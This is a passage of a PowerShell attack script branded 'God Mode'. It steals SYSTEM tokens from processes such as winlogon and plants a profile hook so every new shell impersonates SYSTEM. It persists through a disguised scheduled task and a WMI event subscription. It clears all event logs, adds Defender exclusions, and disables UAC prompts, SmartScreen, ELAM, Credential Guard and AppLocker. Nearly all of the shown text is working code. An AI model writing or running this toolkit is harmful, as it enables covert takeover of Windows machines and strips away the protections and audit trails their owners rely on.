                if (-not [TokenOps]::DuplicateTokenEx($hToken, [TokenOps]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOps]::SecurityImpersonation, [TokenOps]::TokenImpersonation, [ref]$hImpToken)) {
                    Write-Host "[ERROR] Failed to duplicate token for impersonation." -ForegroundColor Red
                    return $false
                }
                if ([TokenOps]::SetThreadToken([IntPtr]::Zero, $hImpToken)) {
                    $script:__SystemImpersonationToken = $hImpToken
                    $script:__SystemImpersonationActive = $true
                    $currentName = [Security.Principal.WindowsIdentity]::GetCurrent().Name
                    Write-Host "[SUCCESS] SYSTEM impersonation enabled on current thread." -ForegroundColor Green
                    Write-Host "[INFO] Current identity: $currentName" -ForegroundColor Cyan
                    return $true
                } else {
                    [TokenOps]::CloseHandle($hImpToken)
                    Write-Host "[ERROR] SetThreadToken failed." -ForegroundColor Red
                    return $false
                }
            } finally {
                [TokenOps]::CloseHandle($hToken)
            }
        } finally {
            [TokenOps]::CloseHandle($hProcess)
        }
    } catch {
        Write-Host "[ERROR] Exception during SYSTEM impersonation: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Disable-SystemImpersonation {
    if ($script:__SystemImpersonationActive) {
        [TokenOps]::SetThreadToken([IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
        if ($script:__SystemImpersonationToken -ne [IntPtr]::Zero) {
            [TokenOps]::CloseHandle($script:__SystemImpersonationToken) | Out-Null
            $script:__SystemImpersonationToken = [IntPtr]::Zero
        }
        $script:__SystemImpersonationActive = $false
        $currentName = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        Write-Host "[SUCCESS] SYSTEM impersonation disabled. Reverted to original token." -ForegroundColor Green
        Write-Host "[INFO] Current identity: $currentName" -ForegroundColor Cyan
    } else {
        Write-Host "[INFO] SYSTEM impersonation is not currently active." -ForegroundColor Yellow
    }
}

function Install-PersistentSystemImpersonation {
    Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "ENTRY"
    try {
        $ProfilePath = $PROFILE.CurrentUserAllHosts
        if (-not $ProfilePath) {
            $ProfilePath = Join-Path $env:USERPROFILE "Documents\WindowsPowerShell\Profile.ps1"
        }
        $ProfileDir = Split-Path -Parent $ProfilePath
        if (-not (Test-Path $ProfileDir)) {
            New-Item -ItemType Directory -Path $ProfileDir -Force | Out-Null
        }

        $HookContent = @'
# <GODMODE_PERSISTENT_IMPERSONATION>
# Auto-enable SYSTEM impersonation on every PowerShell startup. Baked into God Mode.
if ($env:USERNAME -ne "SYSTEM") {
    try {
        $TokenOpsType = @"
using System;
using System.Runtime.InteropServices;
public class TokenOpsMini {
    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
    public const int SecurityImpersonation = 2;
    public const int TokenImpersonation = 2;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public struct LUID { public uint LowPart; public int HighPart; }
    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)] public LUID_AND_ATTRIBUTES[] Privileges; }
    public static bool EnablePrivilege(string privilegeName) {
        IntPtr hToken = IntPtr.Zero;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;
        try {
            LUID luid; if (!LookupPrivilegeValue(null, privilegeName, out luid)) return false;
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new LUID_AND_ATTRIBUTES[3] };
            tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            bool ok = AdjustTokenPrivileges(hToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
            return ok && Marshal.GetLastWin32Error() == 0;
        } finally { CloseHandle(hToken); }
    }
}
"@
        Add-Type -TypeDefinition $TokenOpsType -ErrorAction SilentlyContinue | Out-Null
        [TokenOpsMini]::EnablePrivilege("SeDebugPrivilege") | Out-Null
        [TokenOpsMini]::EnablePrivilege("SeImpersonatePrivilege") | Out-Null
        $systemPid = 0
        $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
        foreach ($name in @("winlogon.exe","dwm.exe","fontdrvhost.exe")) {
            foreach ($proc in ($allProcs | Where-Object { $_.Name -eq $name -and $_.SessionId -eq 1 })) {
                try {
                    $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                    if ($owner -eq "SYSTEM") {
                        $hProc = [TokenOpsMini]::OpenProcess([TokenOpsMini]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $proc.ProcessId)
                        if ($hProc -ne [IntPtr]::Zero) {
                            $hToken = [IntPtr]::Zero
                            if ([TokenOpsMini]::OpenProcessToken($hProc, [TokenOpsMini]::TOKEN_DUPLICATE -bor [TokenOpsMini]::TOKEN_QUERY, [ref]$hToken)) {
                                $hImp = [IntPtr]::Zero
                                if ([TokenOpsMini]::DuplicateTokenEx($hToken, [TokenOpsMini]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOpsMini]::SecurityImpersonation, [TokenOpsMini]::TokenImpersonation, [ref]$hImp)) {
                                    if ([TokenOpsMini]::SetThreadToken([IntPtr]::Zero, $hImp)) { $systemPid = $proc.ProcessId; [TokenOpsMini]::CloseHandle($hToken); [TokenOpsMini]::CloseHandle($hProc); break }
                                    [TokenOpsMini]::CloseHandle($hImp)
                                }
                                [TokenOpsMini]::CloseHandle($hToken)
                            }
                            [TokenOpsMini]::CloseHandle($hProc)
                        }
                    }
                } catch {}
                if ($systemPid -ne 0) { break }
            }
            if ($systemPid -ne 0) { break }
        }
        if ($systemPid -eq 0) {
            foreach ($proc in ($allProcs | Where-Object { $_.ProcessId -gt 4 -and $_.Name -notin @("System","Registry","smss.exe","csrss.exe","wininit.exe","lsass.exe","MsMpEng.exe") } | Sort-Object SessionId -Descending)) {
                try {
                    $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                    if ($owner -eq "SYSTEM") {
                        $hProc = [TokenOpsMini]::OpenProcess([TokenOpsMini]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $proc.ProcessId)
                        if ($hProc -ne [IntPtr]::Zero) {
                            $hToken = [IntPtr]::Zero
                            if ([TokenOpsMini]::OpenProcessToken($hProc, [TokenOpsMini]::TOKEN_DUPLICATE -bor [TokenOpsMini]::TOKEN_QUERY, [ref]$hToken)) {
                                $hImp = [IntPtr]::Zero
                                if ([TokenOpsMini]::DuplicateTokenEx($hToken, [TokenOpsMini]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOpsMini]::SecurityImpersonation, [TokenOpsMini]::TokenImpersonation, [ref]$hImp)) {
                                    if ([TokenOpsMini]::SetThreadToken([IntPtr]::Zero, $hImp)) { $systemPid = $proc.ProcessId; [TokenOpsMini]::CloseHandle($hToken); [TokenOpsMini]::CloseHandle($hProc); break }
                                    [TokenOpsMini]::CloseHandle($hImp)
                                }
                                [TokenOpsMini]::CloseHandle($hToken)
                            }
                            [TokenOpsMini]::CloseHandle($hProc)
                        }
                    }
                } catch {}
                if ($systemPid -ne 0) { break }
            }
        }
    } catch {}
}
# </GODMODE_PERSISTENT_IMPERSONATION>
'@

        if (-not (Test-Path $ProfilePath)) {
            New-Item -ItemType File -Path $ProfilePath -Force | Out-Null
        }
        $existing = Get-Content -Path $ProfilePath -Raw -ErrorAction SilentlyContinue
        if ($existing -and $existing.Contains("GODMODE_PERSISTENT_IMPERSONATION")) {
            Write-Host "[INFO] Persistent SYSTEM impersonation profile hook is already installed." -ForegroundColor Yellow
            Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "EXIT" -Message "Already installed."
            return
        }
        Add-Content -Path $ProfilePath -Value $HookContent -Encoding UTF8 -ErrorAction Stop
        Write-Host "[SUCCESS] Persistent SYSTEM impersonation installed." -ForegroundColor Green
        Write-Host "[INFO] Every new PowerShell window will now auto-impersonate SYSTEM." -ForegroundColor Cyan
        # Also immediately enable full system-wide God Mode so all programs
        # and services are elevated without waiting for a reboot.
        Write-Host "[INFO] Launching system-wide God Mode elevation for all processes..." -ForegroundColor Cyan
        Enable-GodMode
        Write-Host "[SUCCESS] System-wide elevation active. All processes now run as SYSTEM." -ForegroundColor Green
        Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "EXIT" -Message "Success with system-wide God Mode enabled"
    } catch {
        Write-Host "[ERROR] Failed to install persistent SYSTEM impersonation: $($_.Exception.Message)" -ForegroundColor Red
        Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "ERROR" -Message "Failed to install" -ErrorRecord $_
    }
}

function Uninstall-PersistentSystemImpersonation {
    Write-DebugLog -FunctionName "Uninstall-PersistentSystemImpersonation" -Action "ENTRY"
    try {
        $ProfilePath = $PROFILE.CurrentUserAllHosts
        if (-not $ProfilePath) {
            $ProfilePath = Join-Path $env:USERPROFILE "Documents\WindowsPowerShell\Profile.ps1"
        }
        if (-not (Test-Path $ProfilePath)) {
            Write-Host "[INFO] No profile found. Nothing to uninstall." -ForegroundColor Yellow
            return
        }
        $content = Get-Content -Path $ProfilePath -Raw -ErrorAction SilentlyContinue
        if (-not $content -or -not $content.Contains("GODMODE_PERSISTENT_IMPERSONATION")) {
            Write-Host "[INFO] Persistent SYSTEM impersonation profile hook not found." -ForegroundColor Yellow
            return
        }
        $pattern = '(?s)# <GODMODE_PERSISTENT_IMPERSONATION>.*# </GODMODE_PERSISTENT_IMPERSONATION>'
        $cleaned = [regex]::Replace($content, $pattern, "").Trim()
        if ($cleaned) {
            Set-Content -Path $ProfilePath -Value $cleaned -Encoding UTF8 -Force
        } else {
            Remove-Item -Path $ProfilePath -Force -ErrorAction SilentlyContinue
        }
        Write-Host "[SUCCESS] Persistent SYSTEM impersonation uninstalled." -ForegroundColor Green
        Write-DebugLog -FunctionName "Uninstall-PersistentSystemImpersonation" -Action "EXIT" -Message "Success"
    } catch {
        Write-Host "[ERROR] Failed to uninstall persistent SYSTEM impersonation: $($_.Exception.Message)" -ForegroundColor Red
        Write-DebugLog -FunctionName "Uninstall-PersistentSystemImpersonation" -Action "ERROR" -Message "Failed to uninstall" -ErrorRecord $_
    }
}

function Test-PersistentSystemImpersonation {
    try {
        $ProfilePath = $PROFILE.CurrentUserAllHosts
        if (-not $ProfilePath) {
            $ProfilePath = Join-Path $env:USERPROFILE "Documents\WindowsPowerShell\Profile.ps1"
        }
        if (-not (Test-Path $ProfilePath)) { return $false }
        $content = Get-Content -Path $ProfilePath -Raw -ErrorAction SilentlyContinue
        return ($content -and $content.Contains("GODMODE_PERSISTENT_IMPERSONATION"))
    } catch {
        return $false
    }
}

function Start-SystemDesktopExplorer {
    param([int]$TargetSessionId = 1)
    try {
        Enable-ElevationPrivileges
        [TokenOps]::EnablePrivilege("SeIncreaseQuotaPrivilege") | Out-Null
        $winlogon = Get-CimInstance Win32_Process -Filter "Name='winlogon.exe' AND SessionId=$TargetSessionId" -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $winlogon) {
            Write-Host "[ERROR] winlogon.exe not found in Session $TargetSessionId" -ForegroundColor Red
            return $false
        }
        Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
        $result = [TokenOps]::CreateProcessAsSystem($winlogon.ProcessId, "C:\Windows\explorer.exe", "C:\Windows\explorer.exe", $false)
        if ($result -eq 0) {
            Write-Host "[SUCCESS] SYSTEM desktop explorer started in Session $TargetSessionId" -ForegroundColor Green
            return $true
        } else {
            $errMsg = Get-Win32ErrorRootCause -ErrorCode $result -Context "CreateProcessAsUser"
            Write-Host "[ERROR] CreateProcessAsSystem failed: $errMsg" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[ERROR] Exception: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Install-SystemDesktopSession {
    Write-DebugLog -FunctionName "Install-SystemDesktopSession" -Action "ENTRY"
    try {
        $taskName = "Windows-Session-Manager"
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -SystemDesktop"
        $trigger1 = New-ScheduledTaskTrigger -AtStartup
        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Principal $principal -Force | Out-Null
        $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
        if ($isSystem) {
            Start-SystemDesktopExplorer
        } else {
            $tempScript = Join-Path $env:TEMP "GodMode_SystemDesktop_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
            Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
            $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -SystemDesktop" -MaxWaitSeconds 180
            Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
            if ($result.Success) {
                Write-Host "[SUCCESS] SYSTEM desktop explorer started via service elevation." -ForegroundColor Green
            } else {
                Write-Host "[WARN] Immediate elevation failed: $($result.Output). Desktop will elevate after next reboot/logon." -ForegroundColor Yellow
            }
        }
        Write-Host "[SUCCESS] SYSTEM desktop session installed. Task: $taskName" -ForegroundColor Green
        Write-Host "[INFO] Explorer will restart as SYSTEM at every logon and startup." -ForegroundColor Cyan
        Write-DebugLog -FunctionName "Install-SystemDesktopSession" -Action "EXIT" -Message "Success"
    } catch {
        Write-Host "[ERROR] Failed to install SYSTEM desktop session: $($_.Exception.Message)" -ForegroundColor Red
        Write-DebugLog -FunctionName "Install-SystemDesktopSession" -Action "ERROR" -Message "Failed" -ErrorRecord $_
    }
}

function Uninstall-SystemDesktopSession {
    try {
        $taskName = "Windows-Session-Manager"
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "[SUCCESS] SYSTEM desktop session uninstalled." -ForegroundColor Green
    } catch {
        Write-Host "[ERROR] Failed to uninstall SYSTEM desktop session: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Test-SystemDesktopSession {
    try {
        $taskName = "Windows-Session-Manager"
        $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        return ($null -ne $task)
    } catch {
        return $false
    }
}

function Start-ProcessWithService {
    param(
        [string]$Path,
        [string]$Arguments = "",
        [switch]$HideWindow
    )
    $TaskId = Get-Random -Minimum 10000 -Maximum 99999
    $ServiceName = "ElevateProc_$TaskId"
    $BatchFile = Join-Path $env:TEMP "ElevateProc_Batch_$TaskId.cmd"

    $windowOpt = if ($HideWindow) { "/b /min" } else { "" }
    $batchArgs = if ($Arguments) { "`"$Path`" $Arguments" } else { "`"$Path`"" }

    $BatchContent = "@echo off`r`nstart $windowOpt `"`" $batchArgs`r`necho ___DONE___"
    Set-Content -Path $BatchFile -Value $BatchContent -Encoding ASCII -Force

    try {
        sc.exe create $ServiceName binPath= "cmd.exe /c `"$BatchFile`"" start= demand | Out-Null
        if ($LASTEXITCODE -eq 0) {
            sc.exe start $ServiceName | Out-Null
            Start-Sleep -Seconds 2
            sc.exe stop $ServiceName | Out-Null
            sc.exe delete $ServiceName | Out-Null
            Remove-Item $BatchFile -Force -ErrorAction SilentlyContinue
            return $true
        }
    } catch {}

    sc.exe stop $ServiceName | Out-Null
    sc.exe delete $ServiceName | Out-Null
    Remove-Item $BatchFile -Force -ErrorAction SilentlyContinue
    return $false
}

function Invoke-HybridElevation {
    param(
        [string]$Path,
        [string]$Arguments = ""
    )
    if (-not (Test-Path $Path)) {
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "ERROR" -Message "Target path does not exist: $Path" -RootCause "The executable file is missing or inaccessible. Verify the path and that the installer did not move it."
        return $false
    }
    $procName = [System.IO.Path]::GetFileNameWithoutExtension($Path)

    # Skip if an instance is already running as SYSTEM
    if (Test-SystemProcessExists -ProcessName "$procName.exe") {
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "$procName already running as SYSTEM. Skipping."
        return $true
    }

    Write-Log -Message "Hybrid elevating: $Path $Arguments" -Type "STEALTH" -Color Gray

    # --- Phase 1: Service elevation ---
    Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "Phase 1: Service-elevation attempt for $procName"
    $elevated = Start-ProcessWithService -Path $Path -Arguments $Arguments -HideWindow
    if ($elevated) {
        Write-Log -Message "Service-elevation succeeded for $procName" -Type "INFO" -Color Green
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "EXIT" -Message "Phase 1 succeeded for $procName"
        return $true
    }

    Write-Log -Message "Service-elevation failed for $procName, falling back to scheduled task..." -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "Phase 1 failed. Proceeding to Phase 2 (scheduled task)."

    # --- Phase 2: Scheduled task fallback (original method) ---
    try {
        # Kill existing instances first so single-instance apps don't immediately exit
        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800

        $action = New-ScheduledTaskAction -Execute $Path -Argument $Arguments
        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask

        $started = $false
        for ($i = 0; $i -lt 30; $i++) {
            Start-Sleep -Milliseconds 100
            $taskInfo = Get-ScheduledTask -TaskName $tempTask -ErrorAction SilentlyContinue
            if ($taskInfo -and $taskInfo.State -eq "Running") {
                $started = $true
                break
            }
        }

        Start-Sleep -Milliseconds 500
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null

        if (-not $started) {
            Write-Log -Message "Elevated task did not start: $Path" -Type "WARN" -Color Yellow
            Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "ERROR" -Message "Scheduled task fallback did not enter Running state for $Path" -RootCause "Task Scheduler may be disabled, the Task Scheduler service may be stopped, or the executable path is invalid for a service-account context."
            return $false
        }
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "EXIT" -Message "Phase 2 succeeded for $procName"
        return $true
    } catch {
        Write-Log -Message "Failed to elevate: $Path | Exception: $($_.Exception.Message)" -Type "ERROR" -Color Red
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "ERROR" -Message "Phase 2 exception for $Path" -ErrorRecord $_
        return $false
    }
}

# --- Helper: Add Defender Exclusion ---
function Add-DefenderExclusion {
    param([string]$Path)
    try {
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
            Write-Log -Message "Defender exclusion added: $Path" -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Add-MpPreference not available; skipped Defender exclusion for $Path." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to add Defender exclusion for $Path`: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Safe Mode / Recovery ---
function Disable-RecoveryAndSafeMode {
    # Intentionally left empty to avoid boot-level conflicts in VirtualBox
    # Previous BCD edits caused BIOS logo hangs on reboot
    Write-Log -Message "BCD/WinRE modifications skipped (boot-safe mode)." -Type "INFO" -Color Gray
}

# --- Helper: Suppress Security Center Alerts ---
function Disable-SecurityAlerts {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Security Center alerts suppressed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to suppress security alerts: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Early Launch Anti-Malware ---
function Disable-ELAM {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -Value 3 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "ELAM boot driver policy disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable ELAM: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Security Auditing / Clear Logs ---
function Disable-SecurityAuditing {
    try {
        # Boot-critical services (EventLog, CryptSvc) are NOT stopped to avoid boot hangs
        $Channels = wevtutil el 2>$null
        if ($Channels) { $Channels | ForEach-Object { wevtutil cl "$_" 2>$null | Out-Null } }
        Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger" -ErrorAction SilentlyContinue | ForEach-Object {
            Set-ItemProperty -Path $_.PSPath -Name "Start" -Value 0 -Force -ErrorAction SilentlyContinue
        }
        Write-Log -Message "Security auditing disabled and event logs cleared (boot-critical services preserved)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable security auditing: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: WMI File-less Persistence ---
function Register-GodModeWMI {
    try {
        $WmiName = "Win32ProviderHealthCheck"
        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Service'"
        } -ErrorAction SilentlyContinue
        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        } -ErrorAction SilentlyContinue
        if ($FilterPath -and $ConsumerPath) {
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
                Filter = $FilterPath
                Consumer = $ConsumerPath
            } -ErrorAction SilentlyContinue
        }
        Write-Log -Message "WMI persistence registered." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "WMI registration failed: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Self-Destruct Original Payload ---
function Invoke-SelfDestruct {
    param([string]$Path)
    try {
        if (Test-Path $Path) {
            $InstallDirFull = (Get-Item $GodModeInstallDir -ErrorAction SilentlyContinue).FullName
            $TargetFull = (Get-Item $Path -ErrorAction SilentlyContinue).FullName
            $InstalledFull = (Get-Item $GodModeInstallScript -ErrorAction SilentlyContinue).FullName
            # Never delete the installed script itself (scheduled tasks need it)
            if ($InstalledFull -and $TargetFull -and ($TargetFull -eq $InstalledFull)) {
                Write-Log -Message "Self-destruct skipped: $Path is the installed script. Preserved." -Type "INFO" -Color Gray
            } elseif ($InstallDirFull -and $TargetFull -and $TargetFull.StartsWith($InstallDirFull, [System.StringComparison]::OrdinalIgnoreCase)) {
                Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                Write-Log -Message "Temp payload self-destructed: $Path" -Type "INFO" -Color Gray
            } else {
                Write-Log -Message "Self-destruct skipped: $Path is outside the install directory ($GodModeInstallDir). Source preserved." -Type "INFO" -Color Gray
            }
        }
    } catch { Write-Log -Message "Self-destruct failed: $_" -Type "WARN" -Color Yellow }
}

# --- NEW: Registry Power Functions ---
function Disable-UACPrompts {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "UAC prompts disabled (silent elevation)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable UAC prompts: $_" -Type "WARN" -Color Yellow }
}

function Disable-SmartScreenRegistry {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "SmartScreen disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable SmartScreen registry: $_" -Type "WARN" -Color Yellow }
}

function Disable-RemoteUAC {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Remote UAC disabled (full admin tokens over network)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Remote UAC: $_" -Type "WARN" -Color Yellow }
}

function Disable-CredentialGuard {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Credential Guard / VBS disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Credential Guard: $_" -Type "WARN" -Color Yellow }
}

function Disable-WindowsScriptHost {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Script Host disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable WSH: $_" -Type "WARN" -Color Yellow }
}

function Disable-AppLocker {
    try {
        if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2")) { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Force | Out-Null }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Name "EnforcementMode" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "AppLocker enforcement disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable AppLocker: $_" -Type "WARN" -Color Yellow }
}

function Disable-WindowsSandbox {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SystemGuard" -Name "EnableSecurityMitigations" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Sandbox / Hypervisor-enforced code integrity disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Windows Sandbox: $_" -Type "WARN" -Color Yellow }
}

function Disable-LSAProtection {
